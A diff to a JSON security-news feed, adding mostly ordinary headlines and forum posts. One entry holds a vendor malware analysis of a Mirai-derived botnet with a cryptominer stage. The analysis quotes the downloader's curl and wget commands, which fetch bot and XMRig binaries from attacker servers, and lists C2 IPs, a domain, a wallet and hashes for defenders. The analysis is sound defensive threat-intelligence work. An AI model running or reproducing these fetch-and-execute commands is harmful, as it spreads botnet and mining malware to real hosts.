@@ -1,8 +1,186 @@
 {
-  "generated_at": "2025-12-03T12:54:08.377692+00:00",
+  "generated_at": "2025-12-03T13:42:56.288569+00:00",
   "days_back": 30,
-  "total_items": 2051,
+  "total_items": 2065,
   "items": [
+    {
+      "title": "V3G4 Botnet Evolves: From DDoS to Covert Cryptomining",
+      "summary": "Executive Summary Cyble Research & Intelligence Labs (CRIL) has identified an active Linux-targeting campaign that deploys a Mirai-derived botnet, paired with a stealthy, fileless-configured cryptominer. The threat actor employs a multi-stage infection chain starting with a downloader that delivers architecture-specific V3G4 binaries across x86_64, ARM, and MIPS systems. Once active, the bot masquerades as systemd-logind , performs environment reconnaissance, conducts large-scale raw-socket SSH scanning, maintains persistent C2 communication, and ultimately launches a concealed XMRig-based Monero miner dynamically configured at runtime. This activity reflects the ongoing evolution of Mirai-lineage threats, increasingly blending DDoS capabilities with covert cryptomining. Fileless configuration, packed binaries, tmpfs staging, and aggressive scanning techniques highlight the actor\u2019s focus on evasion and monetization across cloud and Internet-exposed Linux environments. This report provides a breakdown of the execution chain, reconnaissance behavior, stealth mechanisms, botnet communication, cryptominer deployment workflow, MITRE TTPs, and IOCs identified during the investigation. Key Takeaways Multi-Stage Infection Chain : Attackers deployed a shell script (named \u201cUniversal Bot Downloader\u201d) that automatically identifies system architecture and downloads the matching bot binary. Mirai-Lineage Botnet : The core payload exhibits behavioral patterns consistent with V3G4/Mirai forks, including SSH scanning, IP spoofing, and DDoS capabilities. Stealth and Evasion : The bot masquerades as systemd-logind, detaches from TTY, suppresses outputs, and uses localhost TCP socket for internal IPC. Raw TCP Scanning : High-speed SYN packet spraying on port 22 is used for SSH brute-force propagation across the Internet. DNS-Based C2 Lookup : Multi-threaded DNS queries target 8.8.8.8 to resolve the C2 domain baojunwakuang[.]asia, mapping to 159.75.47[.]123. Cryptominer Deployment : The malware downloads an XMRig miner disguised as .dbus-daemon into /tmp and receives mining configuration dynamically from the C2 server. Fileless Configuration : Miner parameters, including wallet address, pool, and algorithm, are delivered at runtime, avoiding on-disk artifacts and hindering forensic analysis. Overview This campaign employs a streamlined infection workflow designed for broad compatibility across Linux environments. The first-stage downloader ( universal bot downloader ) exhibits a combination of Mirai-style botnet behavior, identifying system architecture using uname -m and constructing a tailored download path for the corresponding bot binary hosted at 103.149.93[.]224. The payload is written into /tmp, assigned executable permissions, and executed immediately\u2014a classic tactic in IoT and cloud-targeting botnets. Figure 1 below showcases an http server hosting malicious binaries. Figure 1 \u2013 Open directory on http server The second stage , Mddos.x86_64 , is a statically linked and UPX-packed ELF file with stripped symbols, making static inspection more complicated. Upon execution, the bot gathers system information, initializes random seeds for timing variability, and prints a signature banner strongly associated with V3G4/Mirai-derived strains. The malware then transitions into stealth mode\u2014renaming its process to appear as a system daemon (systemd-logind), detaching from the terminal, and launching multiple worker threads responsible for attack operations, C2 communication, and IPC coordination. It uses multiple worker threads to execute attack logic in parallel (non\u2011blocking I/O and pselect(2) used to manage concurrent network operations) A key characteristic of this botnet variant is its use of raw TCP sockets , allowing precise crafting of SYN packets for high-velocity SSH scanning campaigns. In parallel, multiple worker threads aggressively resolve the C2 domain (www.baojunwakuang[.]asia) through repeated queries to Google Public DNS (8.8.8.8) to maintain resilient command channels. Finally, the third stage deploys a covert cryptominer . The loader fetches a UPX-packed XMRig binary from 159.75.47[.]123 and stores it in /tmp/.dbus-daemon to blend with legitimate processes. Instead of shipping a local configuration file, the miner fetches its configuration dynamically from the C2 server, enabling real-time updates to wallet addresses, mining pools, and algorithms while leaving no on-disk artifacts. Our analysis confirms that: A Mirai-style botnet delivered through a custom loader Raw TCP SSH scanning from infected hosts Dynamic, C2-delivered miner configuration Process masquerading for stealth Use of tmpfs for staging and execution Technical Analysis Stage-1: Universal Bot Downloader Script The campaign begins with a compact shell script responsible for fetching the Mirai-derived botnet payload from an attacker-controlled server at 103.149.93[.]224. It initially identifies the CPU architecture (uname -m) of the target device. It maps it to one of several supported versions of the bot binary (targets Linux devices running on x86_64, arm64, arm7, arm5, mips, mipsel CPU). Then, it builds a download URL to fetch the appropriate bot binary in the /tmp directory, assigns executable permissions, and runs it. This aligns with botnets that deploy architecture-specific payloads for propagation. (See Figure 2) Figure 2 \u2013 Universal Bot Downloader script Below is the curl command used for devices running on x86_64 architecture. curl -o Mddos.x86_64 http://103[.]149.93.224/bins/Mddos.x86_64 Stage-2 : Mddos.x86_64 Bot The bot binary is a UPX-packed, statically linked ELF binary with stripped symbols, with custom routines and wrappers embedded, which complicates static analysis. (See Figure 3) Figure 3 \u2013 File attributes Environment & Reconnaissance The malware begins by gathering basic information about the victim, including kernel and architecture details via uname(2), and checking the host\u2019s process limits in order to determine how aggressively it can operate. The system information is later used to register the victim machine with the C2 server. (See Figure 4) Figure 4 \u2013 Environment reconnaissance It also identifies its own executable path and initializes a random seed, which is commonly used to randomize network activity or timing patterns. After initialization, it prints a signature banner (xXxSlicexXxxVEGA.) to the STDOUT console, which matches the behavioral patterns of V3G4 , a Mirai-lineage botnet previously documented by Unit42 - Palo Alto Networks in 2023 and observed in recent cloud infections. Stealth Mechanism Once initialized, the malware shifts into stealth mode. It masquerades itself as a system daemon (\u201csystemd-logind\u201d) using prctl(2) & modifies \u201c/proc/self/cmdline\u201d. Although the write fails due to kernel protections, the intent bears resemblance to widely used stealth techniques in Mirai forks. (See Figure 5) Figure 5 \u2013 Masquerading command line and process name This is an attempt to deceive process\u2011inspection tools by appearing as a legitimate system service, helping it blend into process lists. To further conceal its activity, the malware detaches from any controlling terminal using the setsid(2) system call. It closes all standard input/output streams, allowing it to run silently in the background without user visibility. It then spawns multiple worker threads responsible for attack operations, watchdog supervision, and communication with its command\u2011and\u2011control server. The main thread initializes a TCP listener on 127.0.0.1:63841 , which functions as an internal inter\u2011process communication (IPC) channel used to coordinate its worker threads and helper processes. Using localhost TCP traffic helps the malware blend in with legitimate system daemons and desktop applications, making the activity far less suspicious than pipes, shared memory, or other IPC methods that may trigger security monitoring or policy restrictions. (See Figure 6) Figure 6 \u2013 Mddos.x86_64 bot masquerading as systemd-logind listening on port 63841 Botnet Communication & Scanning Raw TCP Socket The process actively performs high-speed SSH scanning across the Internet. Specifically, the malware opens raw TCP sockets to spray SYN packets to port 22 on numerous target IP addresses. The IPv4 packet headers suggest manually crafted payloads (starting with ASCII E / 0x45), and hundreds of 40-byte packets are transmitted in rapid succession, indicating automated scanning and potential brute-force activity. This behavior closely matches that of Mirai-derived botnet families, which are known for conducting Internet-wide SSH scanning campaigns. (See Figure 7) Figure 7 \u2013 TCP SYN packets flooding over the SSH port C2 DNS resolution In addition to raw sockets, the malware creates standard TCP sockets configured with keepalive options , allowing persistent connections to command-and-control (C2) infrastructure. Simultaneously, it spawns multiple worker threads that each perform DNS queries against 8.8.8.8 to resolve its C2 server (www.baojunwakuang[.]asia resolving to the IP 159.75.47[.]123). This multi-threaded DNS resolution strategy is typical of Mirai-style bots, allowing the malware to maintain connectivity and receive commands while executing attacks in parallel. (See Figure 8) Figure 8 \u2013 DNS query Overall, the combination of raw packet generation, high-speed port 22 targeting, and aggressive C2 resolution strongly indicates that this malware functions as a Mirai-derived SSH scanning and DDoS bot , capable of rapidly identifying vulnerable hosts and coordinating network attacks. Stage 3: Cryptominer Deployment & Fileless Configuration The malware includes a dedicated cryptomining stage that retrieves and executes an XMRig-based Monero miner, named xmrig.x86_64 . The operator employs several stealth techniques, including dynamic (fileless) miner configuration and the use of a packed, stripped binary to hinder static analysis. Miner Delivery Upon execution, the botnet loader forms a download URL & uses wget to fetch a pre-compiled XMRig miner binary from the attacker-controlled server. The binary is dropped in the tmp filesystem, disguised as dbus-daemon. (See Figure 9) Figure 9 \u2013 URL construction to download the xmrig miner from the C2 server The wget command formed is shown below \u2013 wget -q -O /tmp/.dbus-daemon http://159.75.47[.]123/bins/xmrig.x86_64 2>/dev/null The downloaded payload is: UPX-packed , significantly reducing visible code surface. Stripped , removing symbol information to thwart reverse engineering. Temporarily stored under a masqueraded path (/tmp/.dbus-daemon) to blend with legitimate system files. Fileless, C2-Provided Miner Configuration Unlike typical miner deployments that embed a static configuration file on disk (config.json, YAML, etc.), this sample requests runtime configuration data directly from the C2 server . This technique allows the operator to: Avoid exposing wallet addresses, pool endpoints, or algorithms during static analysis Dynamically rotate mining parameters Prevent visibility of miner settings on the infected host During execution, the miner connects back to the same C2 (159.75.47[.]123) and issues a configuration request. The server responds with a JSON blob containing the pool URL, wallet address, algorithm, and thread count. Refer to Figure 10 below for the configuration captured during the analysis. Figure 10 \u2013 Captured cryptominer configuration Figure 11 below shows the extracted configuration data in readable form: Figure 11\u2013 Extracted cryptominer configuration Conclusion This campaign represents a sophisticated and financially motivated operation combining botnet propagation with stealthy cryptomining. The attacker employs multiple advanced techniques\u2014including raw-socket scanning, masqueraded processes, internal localhost IPC, dynamic DNS resolution, and fileless miner configuration\u2014to evade detection and maintain long-term persistence on compromised devices. The blending of Mirai-based DDoS capabilities with XMRig-based mining reflects the continued trend of hybrid monetization strategies , where threat actors maximize ROI by leveraging infected devices not only for botnet attacks but also for illicit cryptocurrency mining. Organizations operating Linux servers, cloud workloads, or exposed IoT devices remain high-value targets and should prioritize hardening and continuous monitoring to mitigate their risk. Cyble's Threat Intelligence Platforms continuously monitor emerging threats, phishing infrastructure, and malware activity across the dark web , deep web , and open sources. This proactive intelligence empowers organizations with early detection, brand and domain protection, infrastructure mapping, and attribution insights. Altogether, these capabilities provide a critical head start in mitigating and responding to evolving cyber threats . Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers. We recommend that our readers follow the best practices given below: 1. Harden External Attack Surface Disable password-based SSH authentication; enforce key-based access. Apply rate-limiting or geo-restrictions on SSH (port 22). Ensure unnecessary internet-exposed services are closed. 2. Monitor for Anomalous Network Activity Detect raw TCP packet floods targeting port 22. Monitor for unusual outbound connections to suspicious IPs and domains. 3. Deploy File Integrity & Runtime Monitoring Alert on download + execution of binaries from /tmp or /dev/shm. Detect unusual process names such as systemd-logind originating from non-system paths. Monitor for UPX-packed ELF binaries on endpoints. 4. Strengthen Cloud and Linux Security Posture Enable SELinux/AppArmor enforcement. Restrict write/execute permissions on temporary filesystems. Implement EDR solutions capable of analyzing Linux process behavior. 5. Proactive Threat Hunting Hunt for evidence of XMRig execution. Search for traces of raw-socket creation or SYN-flood-like behavior. Inspect systems for masqueraded processes or hidden botnet listeners (e.g., 127.0.0.1:63841). 6. Patch and Update Regularly Ensure Linux kernels, SSH services, and IoT firmware remain up to date, closing vulnerabilities exploited by botnet operators. MITRE ATT&CK\u00ae Techniques Tactic Technique ID Procedure Reconnaissance (TA0043) Gather Victim Host Information (T1592)* Collects system details using uname, process limits, architecture, and hostname for C2 registration. Resource Development (TA0042) Acquire Infrastructure \u2014 Infrastructure as a Service (T1583.003) C2 and payload distribution servers hosted at 103.149.93[.]224 and 159.75.47[.]123. Initial Access (TA0001) Valid Accounts (T1078) SSH brute-force attempts to gain credentials and access additional Linux hosts. Execution (TA0002) Command and Scripting Interpreter \u2014 Unix Shell (T1059.004) Downloader script uses curl/wget to fetch and execute the bot payload. Execution (TA0002) Native API (T1106) Bot uses syscalls (setsid, prctl) for stealth. Defense Evasion (TA0005) Masquerading (T1036.005) Renames/processes set to appear like legitimate system services (e.g., systemd-logind). Defense Evasion (TA0005) Obfuscated/Encrypted Files or Information (T1027) Payloads are UPX-packed and stripped to complicate analysis. Defense Evasion (TA0005) Hide Artifacts (T1564.001 \u2013 Hidden Files/Directories) Miner dropped as /tmp/.dbus-daemon to blend with legitimate files. Discovery (TA0007) System Network Configuration Discovery (T1016) / System Information Discovery (T1082) Gathers kernel, architecture, process limits, and host identifiers. Lateral Movement (TA0008) Remote Services \u2014 SSH (T1021.004) Leverages SSH brute-force to move laterally across reachable systems. Command & Control (TA0011) Application Layer Protocol \u2014 DNS (T1071.004) Multi-threaded DNS queries to 8.8.8.8 resolving www.baojunwakuang[.]asia \u2192 159.75.47[.]123. Command & Control (TA0011) (T1571)Non-Standard Port 159.75.47[.]123:60194 used to fetch miner configuration and locaused fLocalhost TCP listener on 127.0.0.1:63841. Impact (TA0040) Network Denial of Service (T1498) Capable of launching DDoS attacks. Impact (TA0040) Resource Hijacking (T1496) Deploys XMRig to consume CPU resources and mine Monero for financial gain. Indicators of Compromise (IOCs) Indicators Indicator Type Description 103.149.93[.]224 IP Address HTTP server hosting Bot Binaries 159.75.47[.]123 IP Address C2 IP www.baojunwakuang[.]asia Domain C2 Domain http://103.149.93[.]224/bins/Mddos.x86_64 URL Download URL for x86_64 bot binary http://103.149.93[.]224/bins/Mddos.arm64 URL Download URL for arm64 bot binary http://103.149.93[.]224/bins/Mddos.arm7 URL Download URL for arm7 bot binary http://103.149.93[.]224/bins/Mddos.arm5 URL Download URL for arm5 bot binary http://103.149.93[.]224/bins/Mddos.mips URL Download URL for mips bot binary http://103.149.93[.]224/bins/Mddos.mpsl URL Download URL for the mpsl bot binary http://159.75.47[.]123/bins/xmrig.x86_64 URL Download URL for cryptominer binary Auto.c3pool[.]org:19999 Pool Mining pool 4AAjsvwrMQxBJpExraeoqdKrV8bwz2kkJG7P4axGTSip46CjmCrvSa8dztbNC4n6XuLr8wiXYgxS9c979hpdmi6s3LCNNja ID Crypto Wallet 2c0261e6a3590e3554202116c5398637d0d7900895646d0aaf46d117aadd1612 SHA256 Hash Mddos binary ARM 8350cd4e9b2f1056c8ccdf0d1b2406b32634840aa304d535ad4b6be5b365275c SHA256 Hash Universal Bot Downloader script d5c55f18b1a7c01d3e4fb657b00aa677784640fef3c1742243a65ded07aeccc6 SHA256 Hash Mddos.x86_64 4ad4fe754acde2f79ced013d7dc7260e111ea23c7a47001e3fb16aa5d268852a SHA256 Hash Mddos.x86_64 2e6fecefa3062d2306124e014643a14066981f4865dedbeffb8c1d057dc650b2 SHA256 Hash Mddos.arm64 f838c2ec86c444d09956934948a28ff6459da7afe820682ead81e4a95deb703a SHA256 Hash Mddos.arm7 39ead6055306739ab969a3531bde2050f556b05e500894b3cda120178f2773be SHA256 Hash xmrig.x86_64 90e28c0d2f2ce83164c2bfdcf42a8746ff055b35b81c95d4b18639b1f2e96885 SHA256 Hash xmrig.x86_64 The post V3G4 Botnet Evolves: From DDoS to Covert Cryptomining appeared first on Cyble .",
+      "link": "https://cyble.com/blog/v3g4-mirai-botnet-evolves/",
+      "source": "Cyble",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2025-12-03T13:41:13+00:00",
+      "published_ts": 1764769273,
+      "smart_groups": [
+        "Curated",
+        "Ransomware",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC",
+        "Linux / Unix",
+        "Malware / Payloads",
+        "Identity / Access",
+        "Phishing / Social Engineering",
+        "Crypto / Web3"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Critical King Addons Vulnerability Exploited to Hack WordPress Sites",
+      "summary": "A critical-severity vulnerability in the King Addons for Elementor plugin for WordPress has been exploited to take over websites. The post Critical King Addons Vulnerability Exploited to Hack WordPress Sites appeared first on SecurityWeek .",
+      "link": "https://www.securityweek.com/critical-king-addons-vulnerability-exploited-to-hack-wordpress-sites/",
+      "source": "SecurityWeek",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2025-12-03T13:36:57+00:00",
+      "published_ts": 1764769017,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Morning Minute: Bank of America Recommends up to 4% Crypto Portfolio Allocation",
+      "summary": "The crypto market liked the news, with majors jumping 7-10% on the back of Bank of America's new guidance plus Vanguard's crypto ETF debut.",
+      "link": "https://decrypt.co/350756/morning-minute-bank-of-america-recommends-up-to-4-crypto-portfolio-allocation",
+      "source": "Decrypt",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2025-12-03T13:31:21+00:00",
+      "published_ts": 1764768681,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "We're at Black Hat Europe",
+      "summary": "EclecticIQ is proud to sponsor and exhibit at Black Hat Europe 2025 , one of the world\u2019s leading cybersecurity and threat intelligence conferences. This year\u2019s event brings more than 3,000 security professionals from over 70 countries to London\u2019s ExCeL for two days of technical briefings, hands-on research, and emerging security insights.",
+      "link": "https://blog.eclecticiq.com/were-at-black-hat-europe",
+      "source": "EclecticIQ Blog",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2025-12-03T13:31:15+00:00",
+      "published_ts": 1764768675,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Cybersecurity and lawsuit",
+      "summary": "Hello, I live in Poland. I\u2019m interested in cybersecurity and I\u2019m slowly building a portfolio with projects on GitHub and TryHackMe. I\u2019m interested in red teaming and CTF tasks. My question is: I want to implement my own RAT for educational purposes / for use in CTF tasks. The problem, however, is the law in my country: [translated from Polish] Art. 269b. [Creating computer programs] \u00a7 1. Whoever creates, acquires, sells or makes available to other persons devices or computer programs designed to commit a crime specified in Article 165 \u00a7 1 point 4, Article 267 \u00a7 3, Article 268a \u00a7 1 or \u00a7 2 in connection with \u00a7 1, Article 269 \u00a7 1 or 2, Article 269a, Article 270 \u00a7 1 or Article 270a \u00a7 1, as well as computer passwords, access codes or other data enabling unauthorized access to information stored in an IT system, ICT system or ICT network, is subject to imprisonment from 3 months to 5 years. \u00a7 1a. No offense under \u00a7 1 is committed by a person who acts solely for the purpose of securing an IT system, ICT system or ICT network against the commission of the crime specified in this provision, or for the purpose of developing a method of such protection. \u00a7 2. In the event of conviction for the offense specified in \u00a7 1, the court shall order the forfeiture of the objects referred to in that provision, and may order their forfeiture if they did not belong to the perpetrator. How to avoid any law-related problems when making such tools? submitted by /u/ResortMany8170 [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1pd453c/cybersecurity_and_lawsuit/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2025-12-03T13:28:16+00:00",
+      "published_ts": 1764768496,
+      "smart_groups": [
+        "Cloud / SaaS"
+      ],
+      "curated": false
+    },
+    {
+      "title": "Ethereum treasury trade unwinds 80% as handful of whales dominate buys",
+      "summary": "Corporate Ether acquisitions continue to decline as the world\u2019s largest corporate ETH holder continues scooping up billions in Ether, aiming to amass 5% of the total supply.",
+      "link": "https://cointelegraph.com/news/ethereum-treasury-trade-unwinds-80-bitmine-dominant?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound",
+      "source": "Cointelegraph.com News",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2025-12-03T13:27:02+00:00",
+      "published_ts": 1764768422,
+      "smart_groups": [
+        "Ransomware"
+      ],
+      "curated": false
+    },
+    {
+      "title": "UK Ransomware Payment Ban to Come with Exemptions, Security Minster Say",
+      "summary": "The UK government\u2019s proposed ransomware payment ban for public sector and critical infrastructure will come with national security exemptions",
+      "link": "https://www.infosecurity-magazine.com/news/uk-ransomware-payment-ban/",
+      "source": "Infosecurity Magazine \u2013 News",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2025-12-03T13:25:00+00:00",
+      "published_ts": 1764768300,
+      "smart_groups": [
+        "Curated",
+        "Ransomware",
+        "Network / OT / ICS"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Got pulled into dealing with our Shadow IT mess and\u2026wow",
+      "summary": "We\u2019ve got way more random crap out there than anyone expected. Between unapproved SaaS tools, personal credit card cloud accounts, and a bunch of mystery VMs nobody can explain, I\u2019m trying to get a handle on what we actually have and what\u2019s talking to what before it blows up in our faces. I\u2019m looking for something that can auto-discover assets and apps across on-prem + cloud, flag unknown systems, and give enough dependency/data-flow context so we can figure out what\u2019s risky and what to tackle first. Bonus points if it doesn\u2019t turn into a three-month deployment or require something so intrusive that my manager will kill it on sight. What are tools are you all using for this kind of visibility, and what\u2019s actually worked for you? We\u2019re looking into ServiceNow Discovery/Service Mapping, Faddom, and Device42 right now. submitted by /u/Nice_Inflation_9693 [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1pd3z5x/got_pulled_into_dealing_with_our_shadow_it_mess/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2025-12-03T13:21:17+00:00",
+      "published_ts": 1764768077,
+      "smart_groups": [
+        "Cloud / SaaS"
+      ],
+      "curated": false
+    },
+    {
+      "title": "What cybersecurity jobs do you think will/will not be taken by AI in the future?",
+      "summary": "Currently an ISSM and partner is a Network Engineer. We had a conversation last night about how my role will probably be taken over by AI in 5-10 years, since it\u2019s all pretty much true/false compliance work. Looking to expand my skillset to accommodate for when that happens, so I\u2019m wondering what roles in cybersecurity or IT do you guys think will/will not be taken by AI in the upcoming years? Thanks! submitted by /u/poppy14s [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1pd3wm6/what_cybersecurity_jobs_do_you_think_willwill_not/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2025-12-03T13:18:13+00:00",
+      "published_ts": 1764767893,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Massive gambling network doubles as hidden C2 and anonymity infrastructure, researchers say",
+      "summary": "A sprawling network that\u2019s seemingly maintained to serve (illegal) online gambling opportunities and deliver malware to Indonesian citizens is likely also being used to provide threat actors command and control (C2) and anonymity services. \u201cThe infrastructure has been active for at least 14 years and currently spans 328,039 domains: 236,433 purchased domains, 90,125 hacked websites, and 1,481 hijacked subdomains, including subdomains of government websites,\u201d says Kobi Ben Naim, CEO and Head of Research at Malanta. \u2026 More \u2192 The post Massive gambling network doubles as hidden C2 and anonymity infrastructure, researchers say appeared first on Help Net Security .",
+      "link": "https://www.helpnetsecurity.com/2025/12/03/indonesian-online-gambling-network/",
+      "source": "Help Net Security",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2025-12-03T13:18:10+00:00",
+      "published_ts": 1764767890,
+      "smart_groups": [
+        "Malware / Payloads"
+      ],
+      "curated": false
+    },
+    {
+      "title": "CWES or BSCP?",
+      "summary": "For work I have to decide to get one of these certifications. I've been doing my own research but I need an extra few opinions of the people of ze interwebz. Which cert is better for a Penetration Tester to learn valuable Web Security skills? Certified Web Exploitation Specialist from HTB or Burp Suite Certified Practioner? Money is not an factor, just the overall experience and marketvalue. Cheers submitted by /u/New_Jellyfish_4655 [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1pd3sjo/cwes_or_bscp/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2025-12-03T13:13:11+00:00",
+      "published_ts": 1764767591,
+      "smart_groups": [
+        "Curated",
+        "Exploit / PoC"
+      ],
+      "curated": true
+    },
+    {
+      "title": "CISA Warns of Android 0-Day Vulnerability Exploited in Attacks",
+      "summary": "CISA has added two critical Android Framework vulnerabilities to its Known Exploited Vulnerabilities catalog, signaling active exploitation in the wild. The vulnerabilities affect the Android OS and pose significant risks to millions of mobile devices worldwide. CISA added the vulnerabilities to its KEV catalog on December 2, 2025, requiring federal agencies and critical infrastructure operators [\u2026] The post CISA Warns of Android 0-Day Vulnerability Exploited in Attacks appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/android-0-day-vulnerability-exploited/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2025-12-03T12:42:28+00:00",
+      "published_ts": 1764765748,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC",
+        "Network / OT / ICS"
+      ],
+      "curated": true
+    },
     {
       "title": "Georgia eyes onchain property rights and tokenization with Hedera partnership",
       "summary": "Georgia explores putting its public registry on the Hedera blockchain and tokenizing real estate through blockchain-integrated government infrastructure.",
@@ -50,6 +228,21 @@
       "published_ts": 1764765301,
       "smart_groups": [
         "Phishing / Social Engineering"
+      ],
+      "curated": false
+    },
+    {
+      "title": "MuddyWater Attacks Critical Infrastructure With Custom Malware and Improved Tactics",
+      "summary": "MuddyWater, an Iran-aligned cyberespionage group also known as Mango Sandstorm, has launched a new, highly targeted campaign against critical infrastructure in Israel and Egypt. Active from September 2024 through March 2025, the group zeroed in on diverse sectors including engineering, utilities, local government, and technology. This operation marks a distinct evolution in their operational maturity, [\u2026] The post MuddyWater Attacks Critical Infrastructure With Custom Malware and Improved Tactics appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/muddywater-attacks-critical-infrastructure/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2025-12-03T12:33:10+00:00",
+      "published_ts": 1764765190,
+      "smart_groups": [
+        "Malware / Payloads",
+        "Network / OT / ICS"
       ],
       "curated": false
     },
@@ -580,6 +773,21 @@
       "curated": true
     },
     {
+      "title": "I just found out our CISO has been forwarding all 'suspicious' emails to his personal Gmail to 'analyze them at home' for the last 3 years.",
+      "summary": "I wish I was joking. I really do. I'm a Senior Security Engineer at a mid-sized healthcare provider (HIPAA relevant, obviously). We've been investigating a weird recurring beacon from our internal network. Long story short, we traced it back to the CISO's workstation. It turns out, he set up an auto-forward rule in Outlook. Any email reported by users as 'phishing' or caught by our gateway as 'medium confidence' gets forwarded to his personal generic Gmail account because he 'doesn't like VPN-ing in on weekends' to check the quarantine. He has been exfiltrating potential malware, PHI, and sensitive internal comms to a free Google account for three years. I confronted him. His response? 'Well, Google has good virus scanners, so it acts as a second opinion.' I am currently staring at a resignation letter. Do I report this to the board? The auditors? Or do I just burn the building down? submitted by /u/Educational-Pilot751 [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1pd0bqm/i_just_found_out_our_ciso_has_been_forwarding_all/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2025-12-03T10:04:26+00:00",
+      "published_ts": 1764756266,
+      "smart_groups": [
+        "Malware / Payloads",
+        "Phishing / Social Engineering"
+      ],
+      "curated": false
+    },
+    {
       "title": "PyTorch Users at Risk: Unveiling 3 Zero-Day PickleScan Vulnerabilities",
       "summary": "submitted by /u/SRMish3 [link] [comments]",
       "link": "https://www.reddit.com/r/netsec/comments/1pd094r/pytorch_users_at_risk_unveiling_3_zeroday/",
@@ -858,6 +1066,20 @@
       "published": "2025-12-03T08:59:14+00:00",
       "published_ts": 1764752354,
       "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Looking for Real-World \u201cConfiguration Drift Gone Wrong\u201d Stories (for a Webinar!)",
+      "summary": "Hey folks \u2014 I\u2019m putting together a webinar on configuration drift and want to include a few real stories from people who\u2019ve actually lived through the chaos. If you\u2019ve ever had drift cause downtime, security gaps, weird edge-case failures, ghost configs, \u201cwho changed this?\u201d moments, or anything that made you question reality, I\u2019d love to hear it. I\u2019m not asking for sensitive details. Just the basics: What drift happened? How you discovered it What the impact was How you fixed it or prevented it from happening again Bonus points for anything funny, absurd, or \u201cthere\u2019s no way this actually shipped to production, but it did.\u201d Thanks in advance \u2014 your pain today may help someone else avoid a 3 a.m. incident tomorrow. (full disclosure, I'm a marketer, obvs, not here to pitch or DM, just gathering stories to make my webinar more interesting. If I use your story I'll keep it anonymous unless you tell me otherwise) submitted by /u/joanesty [link] [comments]",
+      "link": "https://www.reddit.com/r/cybersecurity/comments/1pcz9g8/looking_for_realworld_configuration_drift_gone/",
+      "source": "/r/cybersecurity",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2025-12-03T08:56:13+00:00",
+      "published_ts": 1764752173,
+      "smart_groups": [
+        "Network / OT / ICS"
+      ],
       "curated": false
     },
     {
@@ -28134,20 +28356,6 @@
       "published": "2025-11-03T13:36:59+00:00",
       "published_ts": 1762177019,
       "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "Fresh insights from old data: corroborating reports of Turkmenistan IP unblocking and firewall testing",
-      "summary": "Cloudflare used historical data to investigate reports of potential new firewall tests in Turkmenistan. Shifts in TCP resets/timeouts across ASNs corroborate large-scale network control system changes.",
-      "link": "https://blog.cloudflare.com/fresh-insights-from-old-data-corroborating-reports-of-turkmenistan-ip/",
-      "source": "The Cloudflare Blog",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2025-11-03T13:00:00+00:00",
-      "published_ts": 1762174800,
-      "smart_groups": [
-        "Cloud / SaaS"
-      ],
       "curated": false
     }
   ]
